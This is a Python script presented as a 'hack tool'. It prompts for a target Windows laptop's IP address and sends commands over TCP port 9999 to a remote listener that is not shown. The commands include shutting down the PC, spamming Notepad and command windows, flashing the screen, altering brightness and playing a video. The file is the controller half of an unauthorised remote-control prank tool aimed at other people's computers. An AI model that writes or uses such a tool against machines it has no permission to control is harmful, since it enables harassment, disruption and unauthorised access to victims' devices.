import socket
import os
import time

GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
RESET = "\033[0m"

def show_banner():
    os.system("clear")
    print(f"""{BOLD}{CYAN}
██╗   ██╗██╗ ██████╗ ███╗   ██╗███████╗███████╗██╗  ██╗
██║   ██║██║██╔════╝ ████╗  ██║██╔════╝██╔════╝██║  ██║
██║   ██║██║██║  ███╗██╔██╗ ██║█████╗  ███████╗███████║
╚██╗ ██╔╝██║██║   ██║██║╚██╗██║██╔══╝  ╚════██║██╔══██║
 ╚████╔╝ ██║╚██████╔╝██║ ╚████║███████╗███████║██║  ██║
  ╚═══╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝
              {YELLOW}VIGNESH HACK TOOL {RESET}
    """)

def send_command(target_ip, command):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, 9999))
        client.sendall(command.encode())
        client.close()
        print(f"{GREEN}[+] Command sent: {command}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")

def main():
    show_banner()
    target_ip = input(f"{BOLD}{BLUE}[*] Enter target Windows laptop IP:{RESET} ").strip()

    while True:
        print("\n" + "-" * 50)
        print(f"{BOLD}{YELLOW}Available Commands:{RESET}")
        print(f"    {GREEN}[1]{RESET} Play a video")
        print(f"    {GREEN}[2]{RESET} Crazy Brightness")
        print(f"    {GREEN}[3]{RESET} Stop all hacks")
        print(f"    {GREEN}[4]{RESET} Shutdown PC")
        print(f"    {GREEN}[5]{RESET} LOL (Notepad spam)")
        print(f"    {GREEN}[6]{RESET} CLI Hack (CMD spam)")
        print(f"    {GREEN}[7]{RESET} Flash Screen")
        print(f"    {GREEN}[8]{RESET} Exit")
        print("-" * 50)

        choice = input(f"{BOLD}{CYAN}Enter choice:{RESET} ").strip()

        if choice == "1":
            video_path = input(f"{BOLD}{CYAN}Enter video path:{RESET} ").strip()
            send_command(target_ip, f"play {video_path}")

        elif choice == "2":
            send_command(target_ip, "crazybrightness")

        elif choice == "3":
            send_command(target_ip, "stopall")

        elif choice == "4":
            send_command(target_ip, "shutdown")

        elif choice == "5":
            send_command(target_ip, "lol")

        elif choice == "6":
            send_command(target_ip, "clihack")

        elif choice == "7":
            send_command(target_ip, "flashscreen")

        elif choice == "8":
            print(f"{GREEN}[+] Exiting...{RESET}")
            break

        else:
            print(f"{RED}[-] Invalid choice. Try again!{RESET}")
        time.sleep(1)

if __name__ == "__main__":
    main()
